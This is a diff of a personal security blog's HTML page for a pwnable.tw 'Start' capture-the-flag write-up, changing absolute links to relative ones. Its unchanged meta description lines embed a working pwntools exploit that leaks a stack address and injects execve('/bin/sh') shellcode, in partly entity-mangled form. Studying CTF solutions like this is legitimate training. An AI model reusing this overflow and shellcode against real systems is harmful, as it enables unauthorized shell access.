@@ -11,20 +11,20 @@
 start =remote(&amp;quot;chall.pwnable.tw&amp;quot;,10000) start.recvuntil(&amp;quot;CTF:&amp;ldquo;) payload =&amp;quot;A&amp;quot;20&#43;mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&amp;quot;A&amp;quot;20&#43;p32(stack_addr&#43;20)&#43;&amp;quot;\x90&amp;quot;*4&#43;shellcode start.sendline(payload_next) start.interactive() "/>
 <meta name="keywords" content=""/>
 <meta name="robots" content="noodp"/>
-<link rel="canonical" href="rhamaa.github.io/post/2017-11-20-pwnabletw-start/" />
+<link rel="canonical" href="/post/2017-11-20-pwnabletw-start/" />
 
 
 
 
 
-<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+<link rel="stylesheet" href="/assets/style.css">
 
 
-<link rel="stylesheet" href="rhamaa.github.io/style.css">
+<link rel="stylesheet" href="/style.css">
 
 
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
-<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
 
 
 <meta name="twitter:card" content="summary"/>
@@ -40,7 +40,7 @@ start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldq
 # http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&quot;&ldquo;shellcode &#43;=&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode &#43;=&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode &#43;=&rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode &#43;=&rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&quot;mov_ecx_esp =p32(0x08048087)
 start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldquo;) payload =&quot;A&quot;20&#43;mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&quot;A&quot;20&#43;p32(stack_addr&#43;20)&#43;&quot;\x90&quot;*4&#43;shellcode start.sendline(payload_next) start.interactive() " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="rhamaa.github.io/post/2017-11-20-pwnabletw-start/" />
+<meta property="og:url" content="/post/2017-11-20-pwnabletw-start/" />
 <meta property="og:site_name" content="/home/rhama/" />
 
 
@@ -71,11 +71,11 @@ start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldq
     
       
         
-          <li><a href="rhamaa.github.io/about">About</a></li>
+          <li><a href="/about">About</a></li>
         
       
         
-          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+          <li><a href="/showcase">Showcase</a></li>
         
       
       
@@ -85,11 +85,11 @@ start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldq
   <ul class="menu__inner menu__inner--mobile">
     
       
-        <li><a href="rhamaa.github.io/about">About</a></li>
+        <li><a href="/about">About</a></li>
       
     
       
-        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        <li><a href="/showcase">Showcase</a></li>
       
     
   </ul>
@@ -121,7 +121,7 @@ start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldq
   
 
   <div class="post">
-    <h1 class="post-title"><a href="rhamaa.github.io/post/2017-11-20-pwnabletw-start/">Pwnable.tw - Start (100)</a></h1>
+    <h1 class="post-title"><a href="/post/2017-11-20-pwnabletw-start/">Pwnable.tw - Start (100)</a></h1>
     <div class="post-meta">
       
 
@@ -132,9 +132,9 @@ start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldq
     
       <span class="post-tags">
         
-          #<a href="rhamaa.github.io/tags/pwnabletw/">Pwnabletw</a>&nbsp;
+          #<a href="/tags/pwnabletw/">Pwnabletw</a>&nbsp;
         
-          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
         
       </span>
     
@@ -181,7 +181,7 @@ start.interactive()
           <div class="pagination__buttons">
             
               <span class="button previous">
-                <a href="rhamaa.github.io/post/2017-11-06-pwnabletw-start/">
+                <a href="/post/2017-11-06-pwnabletw-start/">
                   <span class="button__icon">←</span>
                   <span class="button__text">Pwnable.tw - Start (100)</span>
                 </a>
@@ -189,7 +189,7 @@ start.interactive()
             
             
               <span class="button next">
-                <a href="rhamaa.github.io/post/2017-12-1-rc3ctf-2017/">
+                <a href="/post/2017-12-1-rc3ctf-2017/">
                   <span class="button__text">RC3 CTF 2017 - Write Up</span>
                   <span class="button__icon">→</span>
                 </a>
@@ -235,8 +235,8 @@ start.interactive()
   </div>
 </footer>
 
-<script src="rhamaa.github.io/assets/main.js"></script>
-<script src="rhamaa.github.io/assets/prism.js"></script>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
 
 
       
